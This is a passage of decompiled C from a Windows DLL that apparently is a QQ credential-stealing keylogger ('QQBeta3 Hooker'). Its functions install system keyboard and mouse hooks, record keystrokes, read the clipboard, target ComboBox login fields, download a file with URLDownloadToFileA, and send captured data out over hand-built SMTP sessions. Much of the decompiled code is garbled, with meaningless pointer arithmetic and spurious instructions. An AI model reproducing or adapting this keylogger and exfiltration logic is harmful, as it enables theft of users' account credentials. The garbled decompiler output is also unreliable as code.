    *(int32_t *)v13 = 0;
    function_40360f((int32_t)&g118);
    v9 = v13;
    goto lab_0x404ca0;
  lab_0x404ca0:;
    int32_t v14 = v6 - 1; // 0x404ca1
    v5++;
    v7 = v9;
    v6 = v14;
    v4 = v9;
    if (v14 == 0) {
        // break -> 0x404ca8
        goto lab_0x404ca8;
    }
    goto lab_0x404bf4;
}

// Address range: 0x404ccb - 0x404cd0
int32_t function_404ccb(void) {
    // 0x404ccb
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404cd0 - 0x404cd2
int32_t function_404cd0(void) {
    // 0x404cd0
    int32_t result; // 0x404cd0
    return result;
}

// Address range: 0x404cd2 - 0x404cd9
int32_t function_404cd2(int32_t a1, int32_t a2, int32_t a3) {
    // 0x404cd2
    int32_t result; // 0x404cd2
    return result;
}

// Address range: 0x404cf6 - 0x404d6d
int32_t function_404cf6(void) {
    // 0x404cf6
    int32_t v1; // 0x404cf6
    *(int32_t *)v1 = v1 + 1;
    int32_t v2; // 0x404cf6
    int32_t v3 = v2;
    *(char *)v3 = *(char *)&v2 + (char)v3;
    *(char *)0x55000000 = *(char *)0x55000000 + (char)(v2 / 256);
    function_40373f();
    int32_t v4 = __readfsdword(0); // bp-24, 0x404d20
    __writefsdword(0, (int32_t)&v4);
    function_40360f(v2);
    int32_t v5 = function_40374f(); // 0x404d45
    URLDownloadToFileA((int32_t *)v5, NULL, (char *)&g118, (int32_t)&g118, &g118);
    __writefsdword(0, 0);
    return function_40341b();
}

// Address range: 0x404cff - 0x404d00
int32_t function_404cff(void) {
    // 0x404cff
    int32_t result; // 0x404cff
    return result;
}

// Address range: 0x404d6d - 0x404d72
int32_t function_404d6d(void) {
    // 0x404d6d
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404d72 - 0x404d74
int32_t function_404d72(void) {
    // 0x404d72
    int32_t result; // 0x404d72
    return result;
}

// Address range: 0x404d74 - 0x404d79
int32_t function_404d74(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x404d74
    int32_t result; // 0x404d74
    return result;
}

// Address range: 0x404d7e - 0x404dac
int32_t function_404d7e(void) {
    // 0x404d7e
    int32_t v1; // 0x404d7e
    *(int32_t *)v1 = v1 + 1;
    int32_t v2; // 0x404d7e
    int32_t v3 = v2;
    *(char *)v3 = *(char *)&v2 + (char)v3;
    int32_t v4; // 0x404d7e
    uint32_t v5; // 0x404d7e
    *(char *)v4 = *(char *)&v4 + (char)(v5 / 256);
    int32_t v6 = v2;
    *(char *)v6 = *(char *)&v2 + (char)v6;
    int32_t v7; // 0x404d7e
    char * v8 = (char *)(v7 - 117); // 0x404d86
    int32_t v9; // 0x404d7e
    *v8 = *v8 + (char)v9;
    __asm_in((int16_t)v9);
    int32_t v10 = __readfsdword(0); // bp-12, 0x404d92
    __writefsdword(0, (int32_t)&v10);
    g98++;
    __writefsdword(0, v10);
    return 0;
}

// Address range: 0x404dac - 0x404db1
int32_t function_404dac(void) {
    // 0x404dac
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404db1 - 0x404db3
int32_t function_404db1(void) {
    // 0x404db1
    int32_t result; // 0x404db1
    return result;
}

// Address range: 0x404db3 - 0x404db5
int32_t function_404db3(int32_t a1) {
    // 0x404db3
    int32_t result; // 0x404db3
    return result;
}

// Address range: 0x404db7 - 0x404dbf
int32_t function_404db7(void) {
    // 0x404db7
    g98--;
    int32_t result; // 0x404db7
    return result;
}

// Address range: 0x404dbf - 0x404e3e
int32_t function_404dbf(void) {
    // 0x404dbf
    function_40344b();
    int32_t lpSubKey = 0; // bp-116, 0x404dd3
    int32_t lpReserved = 0; // bp-128, 0x404dd9
    int32_t ** lpValueName = (int32_t **)"Software\\mz\\QQBeta3 Hooker"; // bp-132, 0x404ddb
    int32_t result = RegOpenKeyExA(0, (char *)&lpSubKey, 1, 0, (int32_t **)"Software\\mz\\QQBeta3 Hooker"); // 0x404de5
    if (result != 0) {
        // 0x404e39
        return result;
    }
    // 0x404df4
    lpValueName = (int32_t **)101;
    int32_t v1 = RegQueryValueExA((int32_t *)101, (char *)&lpValueName, &lpReserved, &g28, NULL, (int32_t *)"First Run"); // 0x404e17
    if (v1 == 0) {
        // 0x404e20
        function_403537();
    }
    // 0x404e39
    return RegCloseKey((int32_t *)-0x7fffffff);
}

// Address range: 0x404e42 - 0x404f15
int32_t function_404e42(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7) {
    int32_t v1 = a1;
    int32_t v2 = a2;
    int32_t v3; // 0x404e42
    *(int32_t *)v3 = v3 + 1;
    int32_t result; // 0x404e42
    int32_t v4 = result;
    *(char *)v4 = *(char *)&result + (char)v4;
    int32_t v5; // 0x404e42
    char * v6 = (char *)(v5 + 122); // 0x404e46
    uint32_t v7; // 0x404e42
    *v6 = *v6 + (char)(v7 / 256);
    unsigned char v8 = *(char *)&result; // 0x404e49
    unsigned char v9 = v8 + (char)result; // 0x404e49
    *(char *)result = v9;
    int32_t v10; // 0x404e42
    __asm_outsd((int16_t)v3, v10);
    if (v9 == 0) {
        unknown_4ec7();
    }
    // 0x404e50
    result = v2;
    int32_t * v11; // 0x404e42
    int32_t v12; // 0x404e42
    int32_t v13; // 0x404e42
    if (v9 < v8) {
        // 0x404eb8
        *(char *)v13 = (char)v13 + (char)a3;
        char * v14 = (char *)a4; // 0x404ebb
        *v14 = *v14 + (char)(a3 / 256);
        v11 = &v1;
        goto lab_0x404ebe;
    } else {
        char v15 = llvm_ctpop_i8(v9); // 0x404e49
        *(int32_t *)v13 = __asm_insd((int16_t)a4);
        if ((v15 & 1) == 0) {
            // 0x404eb3
            return result;
        }
        // 0x404e57
        v1 = a3;
        v2 = a3;
        int32_t v16 = a4 + 1; // 0x404e59
        v11 = &v2;
        if (v16 == 0) {
            goto lab_0x404ebe;
        } else {
            int32_t v17 = result - 1; // 0x404e5f
            result = v17;
            int16_t v18 = v16; // 0x404e60
            int32_t * v19 = (int32_t *)a7; // 0x404e60
            __asm_outsd(v18, *v19);
            __asm_outsd(v18, *v19);
            char * v20 = (char *)(a7 + 105); // 0x404e66
            unsigned char v21 = *v20; // 0x404e66
            unsigned char v22 = v21 + (char)v17; // 0x404e66
            *v20 = v22;
            v12 = 0;
            if (v22 >= v21) {
                if (v22 == 0) {
                    // 0x404e8d
                    *(int32_t *)-4 = *(int32_t *)result;
                    __writefsdword(result, -4);
                    *(int32_t *)-8 = (int32_t)"Software\\mz\\QQBeta3 Hooker";
                    *(int32_t *)-12 = -0x7fffffff;
                    RegDeleteKeyA(&g118, (char *)&g118);
                    *(int32_t *)(a6 - 8) = 0;
                    int32_t result2 = a6 - 12; // 0x404ea6
                    *(int32_t *)result2 = 1;
                    *(int32_t *)-16 = result2;
                    return result2;
                }
                // 0x404e6d
                *(int32_t *)-4 = v16;
                v12 = -4;
            }
            goto lab_0x404ede;
        }
    }
  lab_0x404ebe:;
    int32_t v23 = (int32_t)v11;
    *(int32_t *)(v23 - 4) = 0;
    *(int32_t *)(v23 - 8) = 0;
    *(int32_t *)(v23 - 12) = (int32_t)"Software\\mz\\QQBeta3 Hooker";
    *(int32_t *)(v23 - 16) = -0x7fffffff;
    RegCreateKeyExA(&g118, (char *)&g118, (int32_t)&g118, (char *)&g118, (int32_t)&g118, (int32_t)&g118, (struct _SECURITY_ATTRIBUTES *)&g118, (int32_t **)&g118, &g118);
    int32_t v24 = function_40354f(); // 0x404ed4
    int32_t v25 = v23 - 20; // 0x404eda
    *(int32_t *)v25 = v24 + 1;
    v12 = v25;
    goto lab_0x404ede;
  lab_0x404ede:
    // 0x404ede
    *(int32_t *)(v12 - 4) = function_40374f();
    *(int32_t *)(v12 - 8) = 1;
    *(int32_t *)(v12 - 12) = 0;
    int32_t * v26 = (int32_t *)(v12 - 16); // 0x404ee8
    *v26 = (int32_t)"First Run";
    int32_t * v27 = (int32_t *)(a6 - 8); // 0x404eed
    *(int32_t *)(v12 - 20) = *v27;
    RegSetValueExA(&g118, (char *)&g118, (int32_t)&g118, (int32_t)&g118, (char *)&g118, (int32_t)&g118);
    int32_t * v28 = (int32_t *)(v12 - 24); // 0x404ef9
    *v28 = *v27;
    RegCloseKey(&g118);
    __writefsdword(0, *v28);
    *v26 = 0x404f1c;
    return function_4033f7();
}

// Address range: 0x404f15 - 0x404f1a
int32_t function_404f15(void) {
    // 0x404f15
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404f1a - 0x404f1c
int32_t function_404f1a(void) {
    // 0x404f1a
    int32_t result; // 0x404f1a
    return result;
}

// Address range: 0x404f1c - 0x404f20
int32_t function_404f1c(void) {
    // 0x404f1c
    int32_t result; // 0x404f1c
    return result;
}

// Address range: 0x404f20 - 0x404f99
int32_t function_404f20(int32_t a1, int32_t result, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8) {
    // 0x404f20
    int32_t v1; // 0x404f20
    *(char *)v1 = 2 * (char)v1;
    int32_t v2; // 0x404f20
    char * v3 = (char *)(v2 + 111); // 0x404f22
    unsigned char v4 = *v3; // 0x404f22
    int32_t v5; // 0x404f20
    unsigned char v6 = v4 + (char)v5; // 0x404f22
    *v3 = v6;
    if (v6 == 0) {
        unknown_4f9f();
    }
    if (v6 < v4) {
        // 0x404f96
        return CloseClipboard();
    }
    char v7 = llvm_ctpop_i8(v6); // 0x404f22
    *(int32_t *)a8 = __asm_insd((int16_t)a4);
    if ((v7 & 1) == 0) {
        // 0x404f8b
        GlobalUnlock(&g118);
        // 0x404f96
        return CloseClipboard();
    }
    int32_t v8 = a4 + 1; // 0x404f31
    if (v8 == 0) {
        // 0x404f96
        return result;
    }
    int32_t v9 = result - 1; // 0x404f37
    int16_t v10 = v8; // 0x404f38
    int32_t * v11 = (int32_t *)a7; // 0x404f38
    __asm_outsd(v10, *v11);
    __asm_outsd(v10, *v11);
    char * v12 = (char *)(a7 + 105); // 0x404f3e
    char v13 = v9; // 0x404f3e
    char v14 = *v12 + v13; // 0x404f3e
    *v12 = v14;
    if (v14 != 0) {
        // 0x404f45
        *(int32_t *)-4 = v8;
        char * v15 = (char *)v9; // 0x404f48
        *v15 = *v15 + v13;
        char * v16 = (char *)(a5 + 86); // 0x404f4a
        *v16 = *v16 + (char)v8;
        *(int32_t *)-8 = a8;
        function_4033f7();
        *(int32_t *)-12 = 0;
        return OpenClipboard(&g118);
    }
    char * v17 = (char *)(2 * a6 + 106); // 0x404f65
    *v17 = 2 * *v17;
    int32_t * v18 = GetClipboardData((int32_t)&g118); // 0x404f6a
    if (v18 == NULL) {
        // 0x404f96
        return CloseClipboard();
    }
    int32_t v19 = (int32_t)v18; // 0x404f6a
    *(int32_t *)-4 = v19;
    if (GlobalLock(&g118) == NULL) {
        // 0x404f96
        return CloseClipboard();
    }
    // 0x404f81
    function_4034fb();
    *(int32_t *)-8 = v19;
    // 0x404f8b
    GlobalUnlock(&g118);
    // 0x404f96
    return CloseClipboard();
}

// Address range: 0x404f9b - 0x404fe8
int32_t DllGetClassObject(int32_t a1) {
    // 0x404f9b
    int32_t v1; // 0x404f9b
    char * lpWindowName = (char *)v1; // 0x404f9e
    char * lpThreadAttributes = lpWindowName; // bp-8, 0x404f9e
    if (*(int32_t *)*(int32_t *)0x408138 == 0) {
        // 0x404fd7
        *(int32_t *)a1 = 0;
        return -0x7ffbfeef;
    }
    // 0x404fae
    int32_t lpClassName; // 0x404f9b
    if (FindWindowA((char *)lpClassName, lpWindowName) == NULL) {
        // 0x404fc1
        CreateThread((struct _SECURITY_ATTRIBUTES *)&lpThreadAttributes, 0, (int32_t (*)(int32_t *))66, (int32_t *)0x4067f3, 0, NULL);
    }
    // 0x404fd7
    *(int32_t *)a1 = 0;
    return -0x7ffbfeef;
}

// Address range: 0x405003 - 0x405006
int32_t DllCanUnloadNow(void) {
    // 0x405003
    return 0;
}

// Address range: 0x405007 - 0x40500a
int32_t DllRegisterServer(void) {
    // 0x405007
    return 0;
}

// Address range: 0x40500b - 0x40500e
int32_t DllUnregisterServer(void) {
    // 0x40500b
    return 0;
}

// Address range: 0x40500f - 0x405034
int32_t function_40500f(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x40501a
    __writefsdword(0, (int32_t)&v1);
    g99++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x405034 - 0x405039
int32_t function_405034(void) {
    // 0x405034
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x405039 - 0x40503b
int32_t function_405039(void) {
    // 0x405039
    int32_t result; // 0x405039
    return result;
}

// Address range: 0x40503b - 0x40503d
int32_t function_40503b(int32_t a1) {
    // 0x40503b
    int32_t result; // 0x40503b
    return result;
}

// Address range: 0x40503f - 0x405047
int32_t function_40503f(void) {
    // 0x40503f
    g99--;
    int32_t result; // 0x40503f
    return result;
}

// Address range: 0x405047 - 0x40515b
int32_t function_405047(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = __readfsdword(0); // bp-292, 0x405069
    int32_t v2 = &v1; // 0x405069
    __writefsdword(0, v2);
    int32_t v3 = v2; // 0x40507e
    if (function_4072d7() != 0) {
        int32_t uFlags; // 0x405047
        switch (uFlags) {
            case 8: {
                // 0x405092
                function_407373();
                function_4037ef();
                v3 = v2;
                // break -> 0x405142
                break;
            }
            case 46: {
                // 0x4050b1
                function_407373();
                function_4037ef();
                v3 = v2;
                // break -> 0x405142
                break;
            }
            default: {
                // 0x4050ce
                int32_t lpKeyState; // bp-264, 0x405047
                GetKeyboardState((char *)&lpKeyState);
                int32_t v4; // bp-316, 0x405047
                int32_t v5 = &v4; // 0x4050f1
                int32_t uScanCode; // bp-8, 0x405047
                uint32_t v6; // 0x405047
                int32_t v7 = ToAscii(0, (int32_t)&uScanCode, (char *)&lpKeyState, (int16_t *)(v6 / 0x10000 & 255), uFlags); // 0x4050f2
                v3 = v5;
                if (v7 == 1) {
                    // 0x4050fa
                    v3 = v5;
                    if (function_40703b() != 0) {
                        // 0x405106
                        v3 = v5;
                        if (function_40354f() <= 15) {
                            // 0x405117
                            function_407373();
                            function_4034eb();
                            function_403837();
                            v3 = v5;
                        }
                    }
                }
                // break -> 0x405142
                break;
            }
        }
    }
    // 0x405142
    __writefsdword(0, *(int32_t *)v3);
    *(int32_t *)(v3 + 8) = 0x405162;
    return function_4033f7();
}

// Address range: 0x40515b - 0x405160
int32_t function_40515b(void) {
    // 0x40515b
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x405160 - 0x405162
int32_t function_405160(void) {
    // 0x405160
    int32_t result; // 0x405160
    return result;
}

// Address range: 0x405162 - 0x405169
int32_t function_405162(int32_t a1, int32_t a2, int32_t a3) {
    // 0x405162
    int32_t result; // 0x405162
    return result;
}

// Address range: 0x40516b - 0x40522a
int32_t function_40516b(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = __readfsdword(0); // bp-32, 0x40517e
    int32_t v2 = &v1; // 0x40517e
    __writefsdword(0, v2);
    function_4072d7();
    __writefsdword(0, v1);
    *(int32_t *)(v2 + 8) = 0x405231;
    return function_40341b();
}

// Address range: 0x40522a - 0x40522f
int32_t function_40522a(void) {
    // 0x40522a
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x40522f - 0x405231
int32_t function_40522f(void) {
    // 0x40522f
    int32_t result; // 0x40522f
    return result;
}

// Address range: 0x405231 - 0x405237
int32_t function_405231(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x405231
    int32_t result; // 0x405231
    return result;
}

// Address range: 0x405237 - 0x4052b1
int32_t function_405237(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = __readfsdword(0); // bp-24, 0x405247
    int32_t v2 = &v1; // 0x405247
    __writefsdword(0, v2);
    int32_t v3 = v2; // 0x405256
    if (function_407247() != 0) {
        // 0x405258
        int32_t lpszWindow; // 0x405237
        int32_t * hWnd = FindWindowExA(NULL, (int32_t *)"ComboBox", NULL, (char *)lpszWindow); // 0x405262
        int32_t v4 = (int32_t)hWnd; // bp-44, 0x405269
        int32_t v5 = &v4; // 0x405269
        if (!IsWindow(hWnd)) {
            // 0x405296
            function_407503();
            v3 = v5;
        } else {
            // 0x405273
            function_4070a7();
            function_40344b();
            function_4073cf();
            v3 = v5;
        }
    }
    // 0x40529b
    __writefsdword(0, *(int32_t *)v3);
    *(int32_t *)(v3 + 8) = 0x4052b8;
    return function_4033f7();
}

// Address range: 0x4052b1 - 0x4052b6
int32_t function_4052b1(void) {
    // 0x4052b1
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4052b6 - 0x4052b8
int32_t function_4052b6(void) {
    // 0x4052b6
    int32_t result; // 0x4052b6
    return result;
}

// Address range: 0x4052b8 - 0x4052bc
int32_t function_4052b8(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4052b8
    int32_t result; // 0x4052b8
    return result;
}

// Address range: 0x4052bc - 0x405336
int32_t function_4052bc(void) {
    // 0x4052bc
    int32_t v1; // 0x4052bc
    *(char *)v1 = 2 * (char)v1;
    int32_t v2; // 0x4052bc
    char * v3 = (char *)(v2 + 111); // 0x4052be
    int32_t v4; // 0x4052bc
    *v3 = *v3 + (char)v4;
    int32_t v5; // 0x4052bc
    int16_t v6 = v5; // 0x4052c1
    int32_t v7; // 0x4052bc
    *(int32_t *)v7 = __asm_insd(v6);
    int32_t v8 = __asm_bound(*(int64_t *)(v7 + 66)); // 0x4052c2
    int32_t v9; // 0x4052bc
    __asm_outsd(v6, v9);
    int32_t v10 = v4;
    *(char *)v10 = *(char *)&v4 + (char)v10;
    char * v11 = (char *)(v8 - 117); // 0x4052ca
    *v11 = *v11 + (char)v5;
    __asm_in(v6);
    int32_t hhk = *(int32_t *)(v8 + 16); // 0x4052d1
    int32_t nCode = *(int32_t *)(v8 + 12); // 0x4052d4
    int32_t wParam = *(int32_t *)(v8 + 8); // 0x4052d7
    if (nCode == 1 != (wParam == 0 == (*(int32_t *)*(int32_t *)0x40812c != 0))) {
        // 0x405321
        return CallNextHookEx((int32_t *)hhk, nCode, wParam, g101);
    }
    // 0x4052f2
    v4 = hhk;
    switch (*(int32_t *)(hhk + 4)) {
        case 256: {
            // 0x405309
            function_405047(v2, v9, v7);
            // break -> 0x405321
            break;
        }
        case 770: {
            // 0x40531a
            function_40516b(v2, v9, v7);
            // break -> 0x405321
            break;
        }
    }
    // 0x405321
    return CallNextHookEx((int32_t *)hhk, nCode, wParam, g101);
}

// Address range: 0x405337 - 0x40537e
int32_t function_405337(int32_t hhk, int32_t nCode, int32_t wParam) {
    // 0x405337
    if (wParam == 0 != g33 != 0) {
        // 0x405367
        return CallNextHookEx((int32_t *)hhk, nCode, wParam, g102);
    }
    // 0x405355
    if (*(int32_t *)(hhk + 8) == 2) {
        // 0x40535f
        int32_t v1; // 0x405337
        int32_t v2; // 0x405337
        int32_t v3; // 0x405337
        function_405237(v2, v3, v1);
    }
    // 0x405367
    return CallNextHookEx((int32_t *)hhk, nCode, wParam, g102);
}

// Address range: 0x40537f - 0x4053b4
int32_t function_40537f(void) {
    // 0x40537f
    g101 = (int32_t)SetWindowsHookExA(0, g82, (int32_t *)0x4052cb, 3);
    int32_t result = (int32_t)SetWindowsHookExA(0, g82, (int32_t *)0x405337, 4); // 0x4053a9
    g102 = result;
    return result;
}

// Address range: 0x4053b7 - 0x4053ce
int32_t function_4053b7(void) {
    // 0x4053b7
    UnhookWindowsHookEx((int32_t *)g101);
    return UnhookWindowsHookEx((int32_t *)g102);
}

// Address range: 0x4053cf - 0x4053f4
int32_t function_4053cf(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x4053da
    __writefsdword(0, (int32_t)&v1);
    g100++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x4053f4 - 0x4053f9
int32_t function_4053f4(void) {
    // 0x4053f4
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4053f9 - 0x4053fb
int32_t function_4053f9(void) {
    // 0x4053f9
    int32_t result; // 0x4053f9
    return result;
}

// Address range: 0x4053fb - 0x4053fd
int32_t function_4053fb(int32_t a1) {
    // 0x4053fb
    int32_t result; // 0x4053fb
    return result;
}

// Address range: 0x4053ff - 0x405407
int32_t function_4053ff(void) {
    // 0x4053ff
    g100--;
    int32_t result; // 0x4053ff
    return result;
}

// Address range: 0x40540a - 0x40567f
int32_t function_40540a(int32_t a1, uint32_t a2, uint32_t a3) {
    // 0x40540a
    int32_t v1; // 0x40540a
    *(int32_t *)v1 = v1 + 1;
    int32_t result; // 0x40540a
    int32_t v2 = result;
    *(char *)v2 = *(char *)&result + (char)v2;
    int32_t v3 = result; // 0x405416
    result = a1;
    int32_t v4 = __asm_bound(*(int64_t *)(v3 + 99)); // 0x40542a
    int32_t v5 = v4 - 2; // 0x40542d
    *(int16_t *)v5 = 0x6a69;
    int32_t v6; // 0x40540a
    int64_t v7 = (int64_t)*(int32_t *)(v6 + 110 + 2 * v6); // 0x405433
    int64_t v8 = 111 * v7; // 0x405433
    if (v8 != 0x6f00000000 * v7 / 0x100000000) {
        // 0x4054ab
        return result;
    }
    int32_t v9; // 0x40540a
    if (v9 == 0) {
        int32_t v10 = (int32_t)((0x100000000 * (int64_t)a3 | (int64_t)result) / (int64_t)a2) + 1; // 0x4054b5
        // 0x4054b7
        return v10 - 1;
    }
    int32_t v11; // bp-16, 0x40540a
    int32_t v12; // 0x40540a
    if (v9 < 0) {
        // 0x4054bb
        v11 = *(int32_t *)v12;
        int32_t * v13 = (int32_t *)result; // 0x4054bc
        *v13 = *v13 + result;
        char * v14 = (char *)(result - 119); // 0x4054be
        *v14 = *v14 + (char)result;
        return result;
    }
    // 0x405442
    if ((llvm_ctpop_i8((char)v9) & 1) != 0) {
        int32_t * v15 = (int32_t *)a3; // 0x405444
        *v15 = *v15 ^ v12;
        *(int32_t *)(v4 - 38) = v3 - 1;
        *(int32_t *)(v4 - 42) = *(int32_t *)(v12 + 0x39383736) ^ v12;
        *(int32_t *)(v4 - 22) = 0;
        *(int32_t *)(v4 - 26) = 0;
        *(int32_t *)(v4 - 30) = 0;
        *(int32_t *)(v4 - 34) = 0;
        *(int32_t *)(v4 - 6) = a3;
        *(int32_t *)(v4 - 46) = v5;
        return 0;
    }
    int32_t v16 = &v11; // 0x405422
    uint32_t v17 = result + 1; // 0x405474
    char * v18 = (char *)(v16 + 48 + 8 * v16); // 0x405475
    *v18 = *v18 + (char)(v17 / 256);
    __writefsdword(v17, v5);
    function_4033f7();
    int32_t v19 = function_40354f(); // 0x405486
    int32_t * v20 = (int32_t *)((int32_t)v8 - 8); // 0x40548b
    *v20 = v19;
    int64_t v21 = 0x100000000 * (int64_t)(v19 >> 31) | (int64_t)v19; // 0x405497
    int32_t result2 = v21 / 3; // 0x405497
    result = result2;
    if ((int32_t)(v21 % 3) != 0) {
        // 0x4054aa
        return result2;
    }
    uint32_t v22 = *v20; // 0x40549d
    // 0x4054b7
    return (int32_t)((0x100000000 * (int64_t)(v22 / 0x80000000) | (int64_t)v22) / 3) - 1;
}

// Address range: 0x40567f - 0x405684
int32_t function_40567f(void) {
    // 0x40567f
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x405684 - 0x405686
int32_t function_405684(void) {
    // 0x405684
    int32_t result; // 0x405684
    return result;
}

// Address range: 0x405686 - 0x40568c
int32_t function_405686(int32_t a1, int32_t a2) {
    // 0x405686
    int32_t result; // 0x405686
    return result;
}

// Address range: 0x40568f - 0x4056e8
int32_t function_40568f(void) {
    struct hostent * v1 = gethostbyname((char *)function_40374f()); // 0x40569d
    function_4027a7();
    int32_t result; // 0x40568f
    if (v1 != NULL) {
        int32_t v2 = *(int32_t *)*(int32_t *)((int32_t)v1 + 12); // 0x4056bd
        result = (int32_t)*(char *)v2;
    }
    // 0x4056da
    return result;
}

// Address range: 0x4056eb - 0x40578f
int32_t function_4056eb(void) {
    // 0x4056eb
    function_40373f();
    int32_t v1 = __readfsdword(0); // bp-452, 0x40570f
    __writefsdword(0, (int32_t)&v1);
    int32_t v2; // bp-412, 0x4056eb
    WSAStartup((int16_t)(int32_t)&v2, (struct WSAData *)257);
    int32_t v3 = 2; // bp-472, 0x40572c
    int32_t sock_fd = socket(AF_UNSPEC, SOCK_STREAM, IPPROTO_IGMP); // 0x40572e
    int32_t v4 = &v3; // 0x405738
    if (sock_fd != -1) {
        int16_t sock = htons((int16_t)function_40568f()); // 0x405752
        int32_t v5 = sock_fd; // bp-488, 0x405767
        int32_t v6 = &v5; // 0x405767
        int32_t v7 = connect((int32_t)sock, (struct sockaddr *)&g118, (int32_t)&g118); // 0x405768
        v4 = v6;
        if (v7 == 0) {
            // 0x405771
            int32_t v8; // 0x4056eb
            *(int32_t *)v8 = sock_fd;
            v4 = v6;
        }
    }
    // 0x405779
    __writefsdword(0, *(int32_t *)v4);
    *(int32_t *)(v4 + 8) = 0x405796;
    return function_4033f7();
}

// Address range: 0x40578f - 0x405794
int32_t function_40578f(void) {
    // 0x40578f
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x405794 - 0x405796
int32_t function_405794(void) {
    // 0x405794
    int32_t result; // 0x405794
    return result;
}

// Address range: 0x405796 - 0x40579f
int32_t function_405796(int32_t a1, int32_t a2, int32_t a3) {
    // 0x405796
    int32_t result; // 0x405796
    return result;
}

// Address range: 0x40579f - 0x4057ab
int32_t function_40579f(void) {
    // 0x40579f
    int32_t v1; // 0x40579f
    closesocket(v1);
    return WSACleanup();
}

// Address range: 0x4057ab - 0x40581c
int32_t function_4057ab(void) {
    // 0x4057ab
    function_40373f();
    int32_t v1 = __readfsdword(0); // bp-4124, 0x4057ce
    __writefsdword(0, (int32_t)&v1);
    function_40374f();
    function_40707f();
    int32_t sock = function_407053(4); // 0x4057f1
    int32_t buf; // bp-4105, 0x4057ab
    int32_t length; // 0x4057ab
    send(sock, (char *)&buf, length, (int32_t)&g118);
    __writefsdword(0, length);
    return function_4033f7();
}

// Address range: 0x40581c - 0x405821
int32_t function_40581c(void) {
    // 0x40581c
    return function_402e0b((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x405821 - 0x405823
int32_t function_405821(void) {
    // 0x405821
    int32_t result; // 0x405821
    return result;
}

// Address range: 0x405823 - 0x40582a
int32_t function_405823(int32_t a1) {
    // 0x405823
    int32_t result; // 0x405823
    return result;
}

// Address range: 0x40582b - 0x405857
int32_t function_40582b(void) {
    // 0x40582b
    int32_t sock; // 0x40582b
    recv(sock, (char *)&g118, (int32_t)&g118, (int32_t)&g118);
    return function_40706b();
}

// Address range: 0x405857 - 0x405acc
int32_t function_405857(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1; // bp-8, 0x405857
    int32_t v2 = &v1; // 0x40585b
    int32_t v3; // 0x405857
    for (int32_t i = 8; i > 0; i--) {
        // 0x405860
        v3 = v2;
        *(int32_t *)(v3 - 4) = 0;
        v2 = v3 - 8;
        *(int32_t *)v2 = 0;
    }
    // 0x405867
    *(int32_t *)(v3 - 12) = 0;
    function_40373f();
    function_40373f();
    function_40373f();
    function_40373f();
    function_40373f();
    function_40373f();
    function_40373f();
    int32_t v4; // bp-4, 0x405857
    *(int32_t *)(v3 - 20) = (int32_t)&v4;
    *(int32_t *)(v3 - 24) = 0x405acc;
    int32_t v5 = __readfsdword(0); // 0x4058b5
    int32_t v6 = v3 - 28; // 0x4058b5
    int32_t * v7 = (int32_t *)v6;
    *v7 = v5;
    __writefsdword(0, v6);
    int32_t * v8 = v7; // 0x4058cf
    int32_t v9 = v6; // 0x4058cf
    if (function_4056eb() != 0) {
        // 0x4058d5
        *(int32_t *)(v3 - 32) = (int32_t)"HELO ";
        *(int32_t *)(v3 - 40) = (int32_t)"\r\n";
        function_40360f((int32_t)&g118);
        function_4057ab();
        function_40582b();
        function_4057ab();
        function_40582b();
        function_403557();
        function_4057ab();
        function_40582b();
        function_403557();
        function_4057ab();
        function_40582b();
        *(int32_t *)(v3 - 44) = (int32_t)"MAIL FROM: <";
        *(int32_t *)(v3 - 48) = a1;
        *(int32_t *)(v3 - 52) = (int32_t)&g2;
        *(int32_t *)(v3 - 56) = (int32_t)"\r\n";
        function_40360f((int32_t)&g118);
        function_4057ab();
        function_40582b();
        *(int32_t *)(v3 - 60) = (int32_t)"RCPT TO: <";
        *(int32_t *)(v3 - 64) = a2;
        *(int32_t *)(v3 - 68) = (int32_t)&g2;
        *(int32_t *)(v3 - 72) = (int32_t)"\r\n";
        function_40360f((int32_t)&g118);
        function_4057ab();
        function_40582b();
        function_4057ab();
        function_40582b();
        *(int32_t *)(v3 - 76) = (int32_t)"From: <";
        *(int32_t *)(v3 - 80) = a1;
        *(int32_t *)(v3 - 84) = (int32_t)&g2;
        *(int32_t *)(v3 - 88) = (int32_t)"\r\n";
        *(int32_t *)(v3 - 92) = (int32_t)"To: <";
        *(int32_t *)(v3 - 96) = a2;
        *(int32_t *)(v3 - 100) = (int32_t)&g2;
        *(int32_t *)(v3 - 104) = (int32_t)"\r\n";
        *(int32_t *)(v3 - 108) = (int32_t)"Subject: ";
        *(int32_t *)(v3 - 112) = a3;
        *(int32_t *)(v3 - 116) = (int32_t)"\r\n";
        *(int32_t *)(v3 - 120) = (int32_t)"\r\n";
        *(int32_t *)(v3 - 124) = a4;
        *(int32_t *)(v3 - 128) = (int32_t)"\r\n";
        *(int32_t *)(v3 - 132) = (int32_t)&g3;
        v9 = v3 - 136;
        v8 = (int32_t *)v9;
        *v8 = (int32_t)"\r\n";
        function_40360f((int32_t)&g118);
        function_4057ab();
        function_40582b();
        function_4057ab();
